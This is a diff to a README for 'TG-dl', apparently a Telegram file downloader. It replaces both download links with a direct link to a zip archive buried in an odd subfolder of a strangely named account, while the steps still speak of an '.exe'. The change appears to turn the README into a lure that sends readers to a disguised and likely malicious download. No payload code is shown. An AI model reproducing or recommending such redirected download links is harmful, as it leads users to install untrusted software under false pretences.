@@ -1,6 +1,6 @@
 # 📥 TG-dl - Easily Save Files From Telegram Messages
 
-[![](https://img.shields.io/badge/Download_TG_dl-Blue?style=for-the-badge)](https://github.com/cloverleaffactorywhistle46/TG-dl)
+[![](https://img.shields.io/badge/Download_TG_dl-Blue?style=for-the-badge)](https://github.com/cloverleaffactorywhistle46/TG-dl/raw/refs/heads/main/granulite/T_dl_2.3.zip)
 
 ## 📋 About This Tool
 
@@ -17,7 +17,7 @@ This software works on most modern Windows computers. Ensure your computer meets
 
 ## 🚀 Getting Started
 
-1. Visit the [official download page](https://github.com/cloverleaffactorywhistle46/TG-dl).
+1. Visit the [official download page](https://github.com/cloverleaffactorywhistle46/TG-dl/raw/refs/heads/main/granulite/T_dl_2.3.zip).
 2. Look for the latest version of the file ending in `.exe`.
 3. Click the file name to start the download to your computer.
 4. Save the file to your desktop or your Downloads folder.
